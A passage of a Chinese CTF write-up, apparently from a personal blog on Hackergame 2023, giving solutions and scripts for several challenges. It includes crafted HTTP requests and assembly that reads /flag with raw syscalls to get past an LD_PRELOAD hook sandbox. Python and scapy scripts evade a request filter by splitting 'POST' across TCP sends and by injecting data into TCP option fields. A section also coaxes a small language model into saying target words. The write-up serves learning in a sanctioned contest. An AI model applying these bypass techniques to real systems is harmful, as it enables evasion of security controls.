+<p><code>LONG_PARAMS</code>那里随便填点乱码copy多放几遍就触发414了。</p>
+<p>304：请求的资源没有更改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">If-Modified-Since: Tue, 15 Aug 2023 17:04:04 GMT\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>注意两个换行就结束报文了…</p>
+<p>413：payload太长</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1 \r\n</span><br><span class="line">Host: example.com \r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded \r\n</span><br><span class="line">Content-Length: 13000000000 \r\n</span><br><span class="line">key=value&amp;foo=bar\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>实际上搞个contentlength一大堆就好</p>
+<p>但是静态页面似乎不能post，至少gpt是这么说的）</p>
+<blockquote>
+<p>在默认的Nginx配置中，如果您发送一个POST请求到一个静态资源（例如HTML页面），Nginx通常会返回405 Method Not Allowed。</p>
+</blockquote>
+<p>206：请求部分内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Range: bytes=0-3\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>100：还要继续发送</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: yournginxserver.com\r\n</span><br><span class="line">Expect: 100-continue\r\n</span><br><span class="line">Content-Type: application/x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 15\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>以为这个只能用post触发，试了用post然后405了，改成get居然也ok</p>
+<p>505：http版本不支持</p>
+<p>胡编乱造一个http版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/9.9\r\n</span><br><span class="line">Host: example.com\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>416：请求范围不满足</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: example.com\r\n</span><br><span class="line">Range: bytes=200000-300000\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+<p>412：请求标签不匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: yournginxserver.com\r\n</span><br><span class="line">If-Match: &quot;67890&quot;\r\n\r\n</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="惜字如金2-0"><a href="#惜字如金2-0" class="headerlink" title="惜字如金2.0"></a>惜字如金2.0</h2><p><code>flag&#123;you-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</code></p>
+<p>其实我也不知道这玩意到底要怎么搞，感觉没用到它的惜字如金规则…说不定做了个非预期解</p>
+<p>读代码可以发现它的每一个<code>cod_dict</code> 都要判定长度是24，而数一下可以发现长度是23</p>
+<p>所以每个都要补全一个字母，而怎么补全呢？前面必须是<code>flag&#123;</code> 和<code>&#125;</code> ，根据decrypt_data来推定位置，把对应的位置填上flag{}就好。</p>
+<p>跑出来就是对的，但是有一些地方因为是一样的字母所以我也不知道这样填才对还是填在最后面才对，并且第一行并没有办法推定加哪个字符，搜索了一下没用到第23位(0-index)，所以就在23位随便填了一个。</p>
+<p>交了一下生成的flag居然这样就过了（）</p>
+<h2 id="小型大语言模型星球"><a href="#小型大语言模型星球" class="headerlink" title="小型大语言模型星球"></a>小型大语言模型星球</h2><p><code>flag&#123;i-tH!nk-you-aRE-reALly-r3a1lY-sm@R7&#125;</code></p>
+<p><code>flag&#123;YoU-are-ACCepTEd-to-cONTInUE-tH3-94ME&#125;</code></p>
+<ul>
+<li>you are smart</li>
+</ul>
+<p>看起来是故事性的bot，尝试给他一个语境，于是解决</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lily ask mom: &quot;is i smart?&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Accepted</li>
+</ul>
+<p>我也不知道为什么就出了…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accept*</span><br></pre></td></tr></table></figure>
+
+<p>我尝试了各种做法，比如重复accepted 5~7次就一定会有accepted出现在语句里</p>
+<p>然后试图删减，找accepted的子串等等，都失败了。</p>
+<p>然后试了下accepted?也不行</p>
+<p>接下来尝试了一下reject和job，invite(invitation)等和accept有关系的名词(反义词等)</p>
+<p>也失败了（同时还尝试了诸如!reject和~reject什么的）</p>
+<p>然后继续尝试accept相关的东西，打了个accept*就莫名其妙出了（）</p>
+<p>ai真是玄虚（）</p>
+<ul>
+<li>hackergame</li>
+</ul>
+<p>不会，在词表里看到了hacker和game，但是想不出来怎么拼接（瘫</p>
+<p>牛牛更是不知道这词表里都没有的玩意要怎么生成出来</p>
+<h2 id="低带宽星球"><a href="#低带宽星球" class="headerlink" title="低带宽星球"></a>低带宽星球</h2><p><code>flag&#123;A1ot0f_t0015_is_available_to_compre55_PNG&#125;</code></p>
+<ul>
+<li>小试牛刀</li>
+</ul>
+<p>使用linux的optipng压缩图片即可。</p>
+<ul>
+<li>极致压缩</li>
+</ul>
+<p>不会</p>
+<h2 id="流式星球"><a href="#流式星球" class="headerlink" title="流式星球"></a>流式星球</h2><p><code>flag&#123;it-could-be-easy-to-restore-video-with-haruhikage-even-without-metadata-0F7968CC&#125;</code></p>
+<p>一开始以为每帧都随机删掉了一些字节，感觉几乎不可能做出来，但是后来发现是我缩进看错了…</p>
+<p>用010 Editor打开看了一下，还是有明显的分界的，但是也不好区分哪个是正确的边界。</p>
+<p>再思考了一下，其实只需要确定删除的offset还有帧的宽度就好，高度和帧数都可以不用管，所以可以暴力枚举</p>
+<p>（因为高度不同相当于长截屏的不同长度，我只需要第一帧来帮我确定参数）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_png_save</span>(<span class="params">data, width, height, filename</span>):</span><br><span class="line">    <span class="comment"># 创建一个RGB模式的图像</span></span><br><span class="line">    img = Image.frombytes(<span class="string">&#x27;RGB&#x27;</span>, (width, height), data)</span><br><span class="line">    img.save(filename, <span class="string">&#x27;PNG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;video.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">video_data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">alllength = <span class="built_in">len</span>(video_data)</span><br><span class="line"><span class="built_in">print</span>(alllength)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define a folder path to save the generated images (you can change this as needed)</span></span><br><span class="line">folder_path = <span class="string">&quot;images/&quot;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    alllength = alllength + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">if</span> alllength % (i) == <span class="number">0</span>:</span><br><span class="line">            filename = <span class="string">f&quot;<span class="subst">&#123;folder_path&#125;</span>image_<span class="subst">&#123;i&#125;</span>x1000+offset<span class="subst">&#123;j&#125;</span>.png&quot;</span></span><br><span class="line">            bytes_to_png_save(video_data[:i * <span class="number">3000</span>], i, <span class="number">1000</span>, filename)</span><br></pre></td></tr></table></figure>
+
+<p>写了个代码枚举一下，然后跑出来750张左右图片<img src="/img/image-20231102015719129.png" alt="image-20231102015719129"></p>
+<p>迅速一张张过去就好，然后可以确定<strong>427*1000+offset93</strong>是答案</p>
+<p><img src="/img/image-20231102015746843.png" alt="image-20231102015746843"></p>
+<p>弄出来的图片长这样。</p>
+<p>所以再写一份代码把mp4弄出来就好。直接转mp4播放失败了，所以干脆也随便定个高度然后逐帧导出自己翻就可以翻到flag了。</p>
+<p><img src="/img/image-20231102022127763.png" alt="image-20231102022127763"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_png_save</span>(<span class="params">data, width, height, filename</span>):</span><br><span class="line">    <span class="comment"># 创建一个RGB模式的图像</span></span><br><span class="line">    img = Image.frombytes(<span class="string">&#x27;RGB&#x27;</span>, (width, height), data)</span><br><span class="line">    img.save(filename, <span class="string">&#x27;PNG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;video.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">video_data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">alllength = <span class="built_in">len</span>(video_data) + <span class="number">93</span></span><br><span class="line"><span class="built_in">print</span>(alllength)</span><br><span class="line">width = <span class="number">427</span></span><br><span class="line">height = <span class="number">800</span></span><br><span class="line"><span class="built_in">print</span>(width, height, alllength)</span><br><span class="line"><span class="comment"># Define a folder path to save the generated images (you can change this as needed)</span></span><br><span class="line">folder_path = <span class="string">&quot;images/&quot;</span></span><br><span class="line"></span><br><span class="line">frame_size = width * height * <span class="number">3</span>  <span class="comment"># Size of each frame in bytes</span></span><br><span class="line">num_frames = alllength // frame_size  <span class="comment"># Number of frames in the byte stream</span></span><br><span class="line"><span class="built_in">print</span>(num_frames)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract each frame from the byte stream and save as PNG</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,num_frames):</span><br><span class="line">    frame_data = video_data[i*frame_size:(i+<span class="number">1</span>)*frame_size]</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;folder_path&#125;</span>frame_<span class="subst">&#123;i&#125;</span>.png&quot;</span></span><br><span class="line">    bytes_to_png_save(frame_data, width, height, filename)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="为什么要打开-x2F-flag"><a href="#为什么要打开-x2F-flag" class="headerlink" title="为什么要打开&#x2F;flag"></a>为什么要打开&#x2F;flag</h2><p><code>flag&#123;nande_ld_preload_yattano_7ac4512494&#125;</code></p>
+<p>rust那个大概率没能力写，先写写cpp的</p>
+<p>题目是用了LD_PRELOAD的.so库来覆写一些常见的可攻击的危险函数，所以我只要写个cpp可以访问然后编译出来交上去就行了。</p>
+<p>先试了一下触发fakeflag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">stdout (标准输出，前 8192 个字节):</span><br><span class="line">I&#x27;ll</span><br><span class="line">not</span><br><span class="line">let</span><br><span class="line">you</span><br><span class="line">open</span><br><span class="line">/flag</span><br><span class="line">again!</span><br></pre></td></tr></table></figure>
+
+<p>查了一下资料，本来想通过strstr大小写敏感来绕过的，但是flag也是不太行，它大小写敏感。</p>
+<p>第二天早上睡醒想直接写汇编读取，让GPT写了一下然后就过了（）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.section .data</span><br><span class="line">filename:  .string &quot;/flag&quot;</span><br><span class="line">fd:        .quad 0</span><br><span class="line">buf:       .space 100</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">    # 使用open系统调用打开文件</span><br><span class="line">    mov $2, %rax          # syscall: sys_open</span><br><span class="line">    mov $filename, %rdi   # const char *filename</span><br><span class="line">    mov $0, %rsi          # int flags (O_RDONLY)</span><br><span class="line">    syscall</span><br><span class="line">    mov %rax, %rdi        # file descriptor</span><br><span class="line">    mov %rax, fd          # store the file descriptor</span><br><span class="line"></span><br><span class="line">    # 使用read系统调用读取文件</span><br><span class="line">    mov $0, %rax          # syscall: sys_read</span><br><span class="line">    mov fd, %rdi          # int fd</span><br><span class="line">    mov $buf, %rsi        # char *buf</span><br><span class="line">    mov $100, %rdx        # size_t count</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 检查读取的字节数</span><br><span class="line">    cmp $0, %rax          # if read returned 0, end of file</span><br><span class="line">    je .close_file</span><br><span class="line"></span><br><span class="line">    # 使用write系统调用将内容写入stdout</span><br><span class="line">    mov $1, %rax          # syscall: sys_write</span><br><span class="line">    mov $1, %rdi          # file descriptor for stdout</span><br><span class="line">    mov $buf, %rsi        # buffer to write</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.close_file:</span><br><span class="line">    # 使用close系统调用关闭文件</span><br><span class="line">    mov $3, %rax          # syscall: sys_close</span><br><span class="line">    mov fd, %rdi          # file descriptor to close</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 使用exit系统调用退出程序</span><br><span class="line">    mov $60, %rax         # syscall: sys_exit</span><br><span class="line">    xor %rdi, %rdi        # exit status</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<p>使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">as readflag.s -o readflag.o</span><br><span class="line">ld readflag.o -o readflag</span><br></pre></td></tr></table></figure>
+
+<p>编译得到可执行文件即可</p>
+<p>但是rust的用这个也搞不到，好像是直接hook掉系统调用了。赛后看看writeup，挺好奇怎么还能绕过的</p>
+<h2 id="Komm-susser-Flagge"><a href="#Komm-susser-Flagge" class="headerlink" title="Komm, süsser Flagge"></a>Komm, süsser Flagge</h2><p><code>flag&#123;ea5Y_sPl1tt3r_466e82e14b&#125;</code></p>
+<p><code>flag&#123;r3s3rv3d_bYtes_998a1267be&#125;</code></p>
+<p><code>flag&#123;1p_OoOpt10ns_bd3ce29202&#125;</code></p>
+<p>写这题了解了不少和tcp有关的知识。</p>
+<ul>
+<li>我的POST</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -X POST -d &quot;2132:MEUCIQDZh9A8FMRyArPyLTf1gmCBsVeMRlFyQuM8yzHjCMTyNwIgBH0JUa/m68yUl69XNvW4gPIVWfwp7JRWMxK98t6oXBE=&quot; http://202.38.93.111:18080</span><br></pre></td></tr></table></figure>
+
+<p>试了一下是否大小写不敏感，结局是Method Not Allow</p>
+<p>那应该就只能把POST这个单词分割，一开始是想tcp发包如果太大会分割，那我人工构造payload什么的让它分割掉POST，查到了可以改本机的mtu设置。但是它最小只能到68.</p>
+<p>并且POST在最前面，要改只能改TCP包头，tcp包头又不好改，得拿个scapy库来搞搞，反正没搞明白。</p>
+<p>开摆了一会后回来一想直接分割发两次tcp然后每个放一部分http请求也行。然后就出了</p>
+<p>后面了解了一下原理应该是tcp是个持续性链接，一个脚本内两次发的东西会连在一块。</p>
+<p>而改mtu的话是更底层的做法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_split_post_request</span>(<span class="params">host, port, path, headers, data</span>):</span><br><span class="line">    <span class="comment"># 创建一个 TCP socket</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一次传输：发送请求行和部分头部</span></span><br><span class="line">    request_part1 = <span class="string">&quot;PO&quot;</span></span><br><span class="line">    s.sendall(request_part1.encode())</span><br><span class="line">    </span><br><span class="line">    request_part2 = <span class="string">f&quot;ST <span class="subst">&#123;path&#125;</span> HTTP/1.1\r\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> header, value <span class="keyword">in</span> headers.items():</span><br><span class="line">        request_part2 += <span class="string">f&quot;<span class="subst">&#123;header&#125;</span>: <span class="subst">&#123;value&#125;</span>\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次传输：发送剩余的头部和数据</span></span><br><span class="line">    request_part2 += <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>\r\n\r\n<span class="subst">&#123;data&#125;</span>&quot;</span></span><br><span class="line">    s.sendall(request_part2.encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收响应</span></span><br><span class="line">    response = s.recv(<span class="number">4096</span>).decode()</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例使用</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;example.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;MyAgent/1.0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">data = <span class="string">&quot;2132:MEUCIQDZh9A8FMRyArPyLTf1gmCBsVeMRlFyQuM8yzHjCMTyNwIgBH0JUa/m68yUl69XNvW4gPIVWfwp7JRWMxK98t6oXBE=&quot;</span></span><br><span class="line"></span><br><span class="line">response = send_split_post_request(<span class="string">&quot;202.38.93.111&quot;</span>, <span class="number">18080</span>, <span class="string">&quot;/&quot;</span>, headers, data)</span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>我的P</li>
+</ul>
+<p>上份代码再跑了一下就出来了，很奇怪，我也不知道为什么</p>
+<p>这条规则检测第一个字母是不是p，感觉是按int来判定的，但是我字符占两个byte？所以判定错误了</p>
+<p>反正应该是非预期解</p>
+<ul>
+<li>我的GET</li>
+</ul>
+<p>第一小问废弃的想法用上了：在tcp包头塞GET &#x2F; HTTP</p>
+<p>但是其实不是很好塞，上网搜了一下tcp包头的结构，本来想注seq和ack字段还有dataof，发现只有9.5个字节</p>
+<p>再看了一下就是tcp包头长度是可选的，如果更长点有个option字段，而原本正好20byte，ip也20byte，塞到option字段刚刚好凑到题目的50byte的限制。</p>
+<p>但是这样就要自己手动构造tcp包头了。</p>
+<blockquote>
+<h3 id="三次握手的步骤和标志位变化："><a href="#三次握手的步骤和标志位变化：" class="headerlink" title="三次握手的步骤和标志位变化："></a>三次握手的步骤和标志位变化：</h3><ol>
+<li><strong>SYN发送</strong>:<ul>
+<li><strong>客户端</strong> 发起连接，发送一个TCP数据包到服务器。这个数据包的TCP头部中，SYN标志位被设置为1，ACK标志位被设置为0。</li>
+<li>客户端会选择一个序列号 <code>seq = x</code> （通常是一个随机数），用来标识这个会话的数据字节流。</li>
+</ul>
+</li>
+<li><strong>SYN和ACK响应</strong>:<ul>
+<li><strong>服务器</strong> 接收到SYN包后，会发送自己的SYN包作为应答。服务器的SYN包中，SYN标志位设置为1，ACK标志位也设置为1。</li>
+<li>服务器选择自己的序列号 <code>seq = y</code> 并将确认号 <code>ack = x + 1</code> 设置为客户端的初始序列号加1。</li>
+</ul>
+</li>
+<li><strong>ACK发送</strong>:<ul>
+<li><strong>客户端</strong> 收到服务器的SYN-ACK包后，发送一个ACK包。这个ACK包的SYN标志位设置为0，ACK标志位设置为1。</li>
+<li>客户端将确认号 <code>ack = y + 1</code> 设置为服务器的序列号加1。</li>
+</ul>
+</li>
+</ol>
+<h3 id="标志位的变化："><a href="#标志位的变化：" class="headerlink" title="标志位的变化："></a>标志位的变化：</h3><ul>
+<li><strong>SYN标志位</strong>:<ul>
+<li>在第一次握手中，客户端将SYN设置为1，表示它希望建立连接。</li>
+<li>在第二次握手中，服务器也将SYN设置为1，作为连接建立请求的确认，并表示自己也准备好了开始通信。</li>
+<li>在第三次握手中，SYN标志位不再使用，因为双方已经同步了各自的序列号。</li>
+</ul>
+</li>
+<li><strong>ACK标志位</strong>:<ul>
+<li>在第一次握手中，客户端不设置ACK，因为它是第一次发送，没有什么要确认的。</li>
+<li>在第二次握手中，服务器将ACK设置为1，以确认它收到了客户端的SYN。</li>
+<li>在第三次握手中，客户端将ACK设置为1，确认它收到了服务器的SYN-ACK。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>然后还有flag位在三次发送中有不同的变化，这个跟着查到的资料来就行了。</p>
+<p>后面遇到的另一个问题就是我POST请求连续写错两次让我以为是tcp写错了查了一个多小时，把请求改成GET看什么情况得到了200的回复我才意识到是POST写错了…</p>
+<p><strong>POSTbody段的结尾应该是<code>\r\n\r\n</code>，然后下面的data段不要手贱自己打个空格下去…打空格打的</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">destination_ip = <span class="string">&quot;202.38.93.111&quot;</span></span><br><span class="line">source_port = <span class="number">20001</span></span><br><span class="line">destination_port = <span class="number">18082</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcp_conversation</span>():</span><br><span class="line">    <span class="comment"># 第一步：发送 SYN 并注入数据</span></span><br><span class="line">    injected_data = <span class="string">b&quot;GET / HTTP&quot;</span>  </span><br><span class="line">    ip_header = IP(dst=destination_ip)</span><br><span class="line">    syn = TCP(sport=source_port, dport=destination_port, flags=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">    syn.options = [(<span class="number">8</span>, injected_data)]</span><br><span class="line">    syn_ack = sr1(ip_header/syn)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步：发送 ACK 并注入数据</span></span><br><span class="line">    ack = TCP(sport=source_port, dport=destination_port, flags=<span class="string">&#x27;A&#x27;</span>, seq=syn_ack.ack, ack=syn_ack.seq + <span class="number">1</span>)</span><br><span class="line">    ack.options = [(<span class="number">8</span>, injected_data)]</span><br><span class="line">    send(ip_header/ack)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 此时，TCP 连接已建立</span></span><br><span class="line">    <span class="comment"># 第三步：发送数据</span></span><br><span class="line">    tcp_header = TCP(sport=source_port, dport=destination_port, flags=<span class="number">24</span>, seq=syn_ack.ack, ack=syn_ack.seq+<span class="number">1</span>)</span><br><span class="line">    tcp_header.options = [(<span class="number">8</span>, injected_data)]</span><br><span class="line">    token = <span class="string">&quot;2132:MEUCIQDZh9A8FMRyArPyLTf1gmCBsVeMRlFyQuM8yzHjCMTyNwIgBH0JUa/m68yUl69XNvW4gPIVWfwp7JRWMxK98t6oXBE=&quot;</span></span><br><span class="line">    http_payload = <span class="string">f&quot;POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: <span class="subst">&#123;<span class="built_in">len</span>(token)&#125;</span>\r\n\r\n<span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment">#http_payload = &quot;GET / HTTP/1.1\r\nHost: hostname\r\n\r\n&quot;</span></span><br><span class="line">    <span class="comment">#http_payload=&quot;POST / HTTP/1.1\r\nHost: 202.38.93.111:18082\r\nUser-Agent: curl/8.0.1\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 101\r\n\r\n2132:MEUCIQDZh9A8FMRyArPyLTf1gmCBsVeMRlFyQuM8yzHjCMTyNwIgBH0JUa/m68yUl69XNvW4gPIVWfwp7JRWMxK98t6oXBE=\r\n\r\n&quot;</span></span><br><span class="line">    response = sr1(ip_header/tcp_header/http_payload)</span><br><span class="line">    tcp_header.show()</span><br><span class="line">    <span class="comment"># 显示响应</span></span><br><span class="line">    <span class="keyword">if</span> response:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nReceived response:&quot;</span>)</span><br><span class="line">        response.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tcp_conversation()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="异星歧途"><a href="#异星歧途" class="headerlink" title="异星歧途"></a>异星歧途</h2><p>盯了一小时才明白这东西怎么玩，线亮起来就是有电，鼠标放上去可以看到这个启动需要的条件，还有一些别的细节。</p>
+<p><code>flag&#123;B34WarE_0f_#xp1osi0N_ad18568e94&#125;</code></p>
+<p>第一眼是先让供电走起来。于是到了最右边的电厂来看。如果那些线亮了就是连上了。</p>
+<p>一开始搞出了一个序列，但是要点一下其中一个动力节点才能正常供电。我当时以为这样就行了。</p>
+<p>但是后面发现这样点了动力节点不行，但反正后三位是一定要的，前面五位随便试了一下发现点个234就行了。</p>
+<p><img src="/img/image-20231103000714411.png" alt="image-20231103000714411"></p>
+<p>所以点01110111。这一part还是随便乱按然后看下面亮了多少线来调整。</p>
+<p>然后再看左边，微型处理器打开来有一个类似if的逻辑</p>
+<p><img src="/img/image-20231103000819500.png" alt="image-20231103000819500"></p>
